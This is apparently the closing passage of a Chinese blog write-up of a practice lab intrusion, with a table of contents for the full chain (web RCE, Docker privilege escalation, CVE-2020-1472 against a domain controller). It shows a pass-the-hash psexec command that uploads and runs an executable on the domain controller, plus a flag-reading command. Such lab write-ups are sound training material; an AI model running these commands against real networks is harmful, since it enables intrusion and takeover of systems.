+<h2 id="psexec本地文件上传执行"><a href="#psexec本地文件上传执行" class="headerlink" title="psexec本地文件上传执行"></a>psexec本地文件上传执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 impacket-0.10.0/examples/psexec.py fbi.gov/administrator@10.10.12.139 -hashes :669a3273144a82b942377c1001ed03a3  -c ./third.exe </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023732298.png" alt="image-20240116023732298"></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/fbi/image-20240116023740487.png" alt="image-20240116023740487"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/PbootCMS%E5%90%8E%E5%8F%B0RCE/">#PbootCMS后台RCE</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Docker%E7%BB%84%E6%8F%90%E6%9D%83/">#Docker组提权</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/jspXCMS%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/">#jspXCMS文件上传目录穿越</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E/">#横向移动密码碰撞</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E5%9F%9F%E6%BC%8F%E6%B4%9ECVE-2020-1472/">#域漏洞CVE-2020-1472</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/09/16/attack/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">有防护的内网域靶场-attack</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶场描述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">1.1.</span> <span class="nav-text">靶场拓扑图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HOSTS%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">HOSTS设置</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">2.</span> <span class="nav-text">外网WEB服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.1.2.</span> <span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CGetShell"><span class="nav-number">2.3.</span> <span class="nav-text">后台任意代码执行GetShell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#disable-funcions%E7%BB%95%E8%BF%87"><span class="nav-number">2.3.1.</span> <span class="nav-text">disable_funcions绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A7%81%E9%92%A5%E7%99%BB%E5%BD%95docker%E6%8F%90%E6%9D%83"><span class="nav-number">2.4.1.</span> <span class="nav-text">私钥登录docker提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91WEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">内网WEB服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0GetShell"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传GetShell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">文件服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">4.1.1.</span> <span class="nav-text">主机发现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%A2%B0%E6%92%9E"><span class="nav-number">4.2.</span> <span class="nav-text">密码碰撞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7"><span class="nav-number">5.</span> <span class="nav-text">域控</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="nav-number">5.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-1472"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2020-1472</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96DC%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="nav-number">5.2.1.</span> <span class="nav-text">获取DC主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5DC%E6%B8%85%E7%A9%BA%E5%87%AD%E6%8D%AE"><span class="nav-number">5.2.2.</span> <span class="nav-text">连接DC清空凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85Hash"><span class="nav-number">5.2.3.</span> <span class="nav-text">获取域内Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87Hash%E9%93%BE%E6%8E%A5%E5%9F%9F%E6%8E%A7"><span class="nav-number">5.2.4.</span> <span class="nav-text">通过Hash链接域控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#psexec%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%89%A7%E8%A1%8C"><span class="nav-number">5.3.</span> <span class="nav-text">psexec本地文件上传执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag"><span class="nav-number">5.4.</span> <span class="nav-text">Flag</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
